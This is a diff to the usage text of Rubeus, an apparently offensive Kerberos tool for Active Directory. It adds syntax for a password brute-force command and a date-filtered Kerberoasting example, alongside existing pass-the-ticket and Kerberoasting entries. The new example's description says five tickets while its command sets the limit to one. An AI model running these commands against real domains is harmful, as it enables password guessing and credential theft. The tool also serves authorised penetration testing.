@@ -32,6 +32,9 @@ Ticket requests and renewals:
     Renew a TGT, optionally applying the ticket or auto-renewing the ticket up to its renew-till limit:
         Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/ptt] [/autorenew]
 
+    Perform a bruteforcing attack against Kerberos:
+        Rubeus.exe brute  </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose]
+
 
 Constrained delegation abuse:
 
@@ -93,6 +96,9 @@ Roasting:
     Perform ""opsec"" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
         Rubeus.exe kerberoast /rc4opsec
 
+    Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
+        Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:1
+        
     Perform AES Kerberoasting:
         Rubeus.exe kerberoast /aes
 
